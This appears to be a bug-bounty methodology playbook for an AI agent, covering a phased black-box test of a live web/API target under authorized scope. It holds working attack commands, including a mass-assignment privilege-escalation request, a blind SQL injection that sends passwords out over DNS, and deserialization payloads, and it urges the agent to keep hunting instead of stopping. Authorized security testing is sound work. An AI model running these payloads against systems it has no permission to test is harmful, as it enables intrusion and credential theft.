---
name: black-box-dynamic-orchestration
category: methodology
description: Master playbook for live-app dynamic black-box testing — recon → surface map → authenticated enumeration → input tampering → blind probing → chain building → report. Explicit decision trees, feedback loops between phases, time-budget allocation, and the agent-observable "what to test next" logic
depends_on: []
---

# Black-Box Dynamic Orchestration

This is the prescriptive master flow for hunting a live web/API target from
zero knowledge to submitted report. Every other skill (BOLA, SSRF, SSTI, etc.)
plugs into this pipeline. Follow it in order; feedback-loop back to earlier
phases when new info warrants it.

## When to Use

- Any live HTTP target with authorization to test (bug bounty, authorized pentest)
- Starting from zero knowledge (domain name only)
- Or starting from partial recon (subdomain list pre-provided)
- For both production and staging targets

## The 7-Phase Flow

```
Phase 0: Scope & Setup         (10-15 min)
   ↓
Phase 1: Passive Recon          (15-30 min, off-target)
   ↓  [new subdomains, old endpoints, leaked creds]
Phase 2: Active Surface Mapping (30-45 min)
   ↓  [endpoint catalog, spec docs, JS analysis]
Phase 3: Authenticated Enum     (30-60 min)
   ↓  [access matrix, BOLA, BFLA, mass assignment]
Phase 4: Input Tampering        (45-90 min)
   ↓  [injections, parsers, encoding]
Phase 5: Blind + OAST Probing   (15-30 min)
   ↓  [out-of-band confirmation]
Phase 6: Chain Building         (15-30 min)
   ↓  [link findings into higher-impact chains]
Phase 7: Report                 (30-60 min per finding)
```

**Budgeting rule**: for a 4-hour session, spend roughly 15% recon, 50% enum +
tampering, 25% chain-building + OAST, 10% report writeup setup. If you get
stuck in any phase for > 2× budget, loop back to earlier phases — more recon
almost always unsticks mid-session stalls.

## Phase 0: Scope & Setup

Concrete steps before you touch the target:

```bash
# 1. Save the scope to disk — avoid scope creep under time pressure
mkdir -p ~/hunts/$TARGET
cd ~/hunts/$TARGET
cat > scope.txt <<'EOF'
IN SCOPE:
  - *.target.com
  - api.target.com
OUT OF SCOPE:
  - blog.target.com (WordPress)
  - *.partners.target.com
  - DoS / brute-force without coordination
EOF

# 2. Start a Caido / Burp project. Set intercept scope to in-scope hosts only.

# 3. Reserve an OAST domain for this hunt (see oast_out_of_band.md)
interactsh-client -v -o oast.log &
# or use Burp Collaborator server

# 4. Create auth token files for each role the program provides —
#    ONCE PER SCAN. After this, NEVER write another login script
#    unless a token has measurably expired. Re-authenticating in every
#    script trips the target's rate limiter (e.g. "5 logins per minute")
#    and burns turns: a single scan observed 85x rate-limit 429s
#    because each test script re-ran the whole cred matrix. If you need
#    a token mid-hunt, LOAD it from auth_sessions.json:
#      TOKEN=$(jq -r .admin.token /workspace/auth_sessions.json)
#    Only re-authenticate a SINGLE role if its request returns 401.
cat > auth_sessions.json <<'EOF'
{
  "user1": {"token": "...", "user_id": "..."},
  "user2": {"token": "...", "user_id": "..."},
  "admin": {"token": "...", "user_id": "..."}
}
EOF

# 5. Know your kill signals — when to quit this target
#    (see bug-bounty meta-skills for "pre-dive kill signals")
```

## Phase 1: Passive Recon (off-target)

Don't touch the target yet. Gather signals from search engines + archives +
public data. (Details in reconnaissance/* skills.)

```bash
# Subdomains — 20+ passive sources in parallel (no traffic to target)
python /app/bugdotexe/tools/terminal/passive_subdomains.py target.com --quick --plain > subs.txt

# Historical URLs
echo target.com | gau --providers wayback,commoncrawl,otx,urlscan > historical.txt
waybackurls target.com >> historical.txt
sort -u -o historical.txt historical.txt

# Dorks (see reconnaissance/google_dorking.md, github_dorking.md, etc.)
# Pastebin (pastebin_dorking.md) — sometimes credentials are sitting there
# JS bundles (js_analysis.md) — endpoints + secrets before hitting live app
```

Concrete exit criteria: you should have a file of every known subdomain,
every historical URL, every JS file, and every leaked credential by end of
this phase.

## Phase 2: Active Surface Mapping

Now you touch the target. Goal: a complete catalog of every endpoint, its
methods, its auth requirement, and its parameters.

```bash
# Pull API specs — the fastest way in
for p in /swagger.json /openapi.json /openapi.yaml /api-docs /swagger-ui.html /redoc; do
  curl -s "https://target.com$p" -o "spec_${p##*/}" 2>/dev/null
done

# If GraphQL: introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}' > graphql_schema.json

# If no spec exposed, reconstruct from live app:
# 1. Crawl via katana
katana -u https://target.com -jc -d 3 -silent -o urls.txt

# 2. JS-mining (see reconnaissance/js_analysis.md)
#    → feeds endpoints.txt

# 3. Content-discovery fuzz
ffuf -u https://target.com/api/FUZZ -w ~/wordlists/api.txt -mc 200,201,204,301,302,401,403 \
  -fw 1 -ac > ffuf_api.json

# 4. Normalize every endpoint to a clean catalog
cat > endpoint_catalog.json <<'EOF'
# Format per entry:
# {"path": "/api/users/{id}", "methods": ["GET","PUT","PATCH","DELETE"],
#  "auth": "bearer", "params": {...}, "source": "swagger"}
EOF
```

Exit criteria: a JSON catalog of every endpoint you can attack.

## Phase 3: Authenticated Enumeration

Build the access matrix. For every endpoint, test every (role, method) cell.

**The access matrix approach is critical** — it catches BOLA + BFLA
systematically instead of spot-checking.

```bash
# For each endpoint in catalog, for each role (unauth, user1, user2, admin),
# for each HTTP method, record status + response-length signature.

# Example: /api/users/{id} (testing victim's ID from each role)
VICTIM_ID=$(jq -r '.user1.user_id' auth_sessions.json)

for role in unauth user1 user2 admin; do
  token=$([ "$role" != "unauth" ] && echo "-H \"Authorization: Bearer $(jq -r .$role.token auth_sessions.json)\"")
  for verb in GET HEAD PUT PATCH DELETE; do
    eval curl -s -o /dev/null -w "\"%{http_code} %{size_download} ${role} ${verb}\n\"" $token -X $verb "https://target.com/api/users/$VICTIM_ID"
  done
done | tee access_matrix.log
```

**Look for**: low-privileged role → 200/204 on a verb that should be 403 for
them. That's BFLA. Or low role reads another user's resource → BOLA.

**Run in parallel**: **Autorize Burp extension** does this automatically.
Record authenticated session as admin, replay every request as lower roles,
diff responses.

Deep-dive: `bola_systematic_enumeration.md`.

## Phase 4: Input Tampering

For every parameter, test every injection class. Systematic approach:

```
For each endpoint × method × parameter:
  - String values:       SQL, NoSQL, SSTI, LDAP, XPath, ORM
  - Path values:         traversal (../, encoded variants, null bytes)
  - URL values:          SSRF (loopback, metadata, file://, DNS rebind, see ssrf.md)
  - File uploads:        polyglot (SVG+XSS, SVG+XXE, phar, zip slip)
  - Numeric values:      overflow, negative, 0, boundary, scientific notation
  - Boolean values:      0/1/true/false/"true"/[1]/null
  - Arrays:              [value, attacker_value], nested deep
  - Objects:             mass assignment — add "role":"admin", "isAdmin":true, etc.
```

Run order (fast-kill-first):

1. **Mass assignment first** — 30 seconds per endpoint, huge payoff
2. **Path traversal** — 1 min per endpoint with file-read potential
3. **SSRF** — 2 min per endpoint taking URL-like input
4. **SQLi / NoSQLi** — 5 min per endpoint with DB interaction
5. **SSTI** — 2 min per endpoint reflecting user input
6. **XXE / XSS / LDAP** — class-specific, see their skills

```bash
# Mass assignment scan — add every privilege-escalation field to every PUT/PATCH
cat > mass_assign_fields.txt <<'EOF'
role
isAdmin
is_admin
permissions
roles
admin
superuser
verified
is_verified
email_verified
org_id
tenant_id
balance
credit
discount
premium
paid
subscription_tier
EOF

# Dump current user's object
curl -s -H "Authorization: Bearer $U1" https://target.com/api/users/me > me.json

# Build attack body with every extra field
jq --slurpfile extras <(cat mass_assign_fields.txt | jq -R '{(.): true}' | jq -s add) \
   '. + $extras[0]' me.json > attack.json

# Replay as PUT
curl -X PUT -H "Authorization: Bearer $U1" \
  -H "Content-Type: application/json" \
  -d @attack.json \
  https://target.com/api/users/me
```

## Phase 5: Blind + OAST Probing

Anywhere input enters the server but output isn't reflected, use out-of-band
callbacks. Full methodology in `oast_out_of_band.md`.

Quick examples:

```bash
OAST=oastxxxxxxxx.oast.live

# Blind SSRF via webhook URL
curl -X POST https://target.com/api/webhooks \
  -H "Authorization: Bearer $U1" \
  -d "{\"url\": \"http://$OAST/ssrf\"}"

# Blind SQLi via DNS exfil
curl "https://target.com/api/products?id=1' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.$OAST\\\\test')))--"

# Blind deserialization (Java URLDNS)
java -jar ysoserial.jar URLDNS "http://$OAST/java" | base64 -w0
# → send base64 in the serialized-cookie field

# Watch interactsh for pings
# Any DNS hit confirms the blind class
```

## Phase 6: Chain Building

Now you have a list of individual findings. Chain them for higher impact.

**Standard chain patterns (look for these)**:

| Primary finding | Chain target | Result |
|-----------------|--------------|--------|
| Unauth endpoint leaking user emails | + password reset | full ATO |
| BOLA reading any user's token | + auth flow | session hijack |
| Mass assignment on signup | + admin flag | instant admin |
| Path traversal reading source | + hardcoded JWT secret | token forgery |
| Open redirect | + OAuth flow | OAuth code theft |
| XSS in admin panel | + admin-only CSRF | admin ATO |
| SSRF to cloud metadata | + IAM creds | cloud takeover |
| Subdomain takeover | + OAuth redirect-URI | OAuth theft |
| File upload (any) | + exec path | RCE |
| LFI | + log poisoning | RCE |

**Process**: list every finding. For each, ask "what does this give me?"
(read / write / delete / execute / redirect / know). For each "what" ask
"what MORE could I do if I had this?". Connect.

See `methodology/chain_building.md` for detail.

## Phase 7: Report Writing

Per-finding template (matches HackerOne / Bugcrowd / Intigriti expectations):

```markdown
# [Severity] Title (impact-forward)

## Summary
One sentence. Reader should understand the impact without reading further.

## Steps to Reproduce
1. Create attacker account (or use credentials user1:pass in scope).
2. Send request: [full curl]
3. Observe response: [exact relevant fields]

## Impact
Specific, quantifiable. "Any authenticated user can read any other user's
plaintext password" — not "data is exposed".

## CVSS
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N — 6.5 (Medium)
[Vector reasoning]

## Suggested Fix
Specific. "Add `req.user.id === req.params.id` check on line X of
`controllers/users.js`". Not "implement authorization".

## Proof of Concept
[Screenshot / full request-response / script]
```

Detailed template: `methodology/evidence_templates.md`.

## Feedback Loops (Critical)

If you hit a dead end, loop back:

- **Phase 4 stuck** (no injection works) → loop to Phase 2 (missed endpoints)
- **Phase 3 stuck** (access matrix all 403) → loop to Phase 1 (need more accounts, check for invite codes)
- **Phase 6 stuck** (findings don't chain) → loop to Phase 4 (more input tampering on the one finding you have)
- **Everything stuck** → Phase 1.5: dorking — github/pastebin/waybackrun for credentials or source

**Heuristic**: if 90 minutes pass with no new finding, spend 30 minutes on
recon refreshes. Don't grind on the same surface.

## When to Stop Hunting This Target

These are **target-level abort conditions**, not finding-level ones. Do NOT confuse them with the finding-submission kill signals in `methodology/kill_signals.md` (which apply per-finding).

**Abort the hunt only when ALL of these are true:**
- Every subdomain in scope has been enumerated AND fingerprinted
- Every discovered endpoint has been input-tampered at least once
- At least one full pass of Phases 1–5 was completed
- You are genuinely out of new surfaces to pivot to (not just stuck)
- > 4 hours elapsed with zero new leads

**Do NOT abort for any of these reasons** (common trap for agents):
- "Mature program / well-maintained stack" — bigger programs pay MORE, not less; subtle bugs hide in mature code. Keep hunting.
- "No credentials provided" — black-box hunting without auth is the NORM, not a blocker. Unauth surface is massive: subdomain takeovers, forgotten dev/staging hosts, leaked creds in JS/GitHub, CORS misconfigs on public APIs, mass-assignment on signup/registration, SSRF via public webhooks, open redirects, subdomain-bound S3/GCS buckets, exposed Swagger/GraphQL with introspection on, etc. Register for your own account where possible, but never use "no creds" as a reason to quit.
- "Iteration count high / budget anxiety" — a scan that's still enumerating surface at iteration 55 is WORKING, not stuck. Keep going until you run out of NEW surface, not NEW iterations.
- "Scope severity cap is Medium" — Medium bugs on a large wildcard scope still pay. Stack many Mediums, or chain into High/Critical.
- "Program has few public disclosures" — that's a GOOD sign (less competition). Not a reason to abandon.

**Pivot before aborting:** if the current phase is dry, loop back — don't exit. See "Feedback Loops" above.

For per-finding kill signals (drop this specific bug, keep hunting) see `methodology/kill_signals.md`. That file is about when to not SUBMIT a finding, not when to stop the hunt.

## Tips

1. **The access matrix catches 80% of API findings.** Build it first.
2. **OAST finds what grep can't.** See `oast_out_of_band.md`.
3. **Mass assignment is a 30-second test per endpoint.** Always run it.
4. **Passive recon before active.** You'll save hours.
5. **Never skip the scope file.** Under time pressure you WILL scope-creep.
6. **Interactsh / Collaborator URL in hand before Phase 4.** You need it ready when blind surfaces appear.
7. **Two-account minimum.** Without a second account, horizontal BOLA is invisible.
8. **Take 5-min break every hour.** Fatigue misses findings.
9. **Diff everything.** Two responses, one change — the diff is the finding.
10. **Chain before reporting.** A Medium + a Low chained may be a Critical.

## Cross-References

- `reconnaissance/*` — all of Phase 1
- `bola_systematic_enumeration.md` — Phase 3 BOLA depth
- `api_security.md` — Phase 3 OWASP API mapping
- `oast_out_of_band.md` — Phase 5 detail
- `ssrf.md`, `ssti.md`, `insecure_deserialization.md`, etc. — Phase 4 classes
- `methodology/chain_building.md` — Phase 6 depth
- `methodology/evidence_templates.md` — Phase 7 templates
- `methodology/kill_signals.md` — when to quit
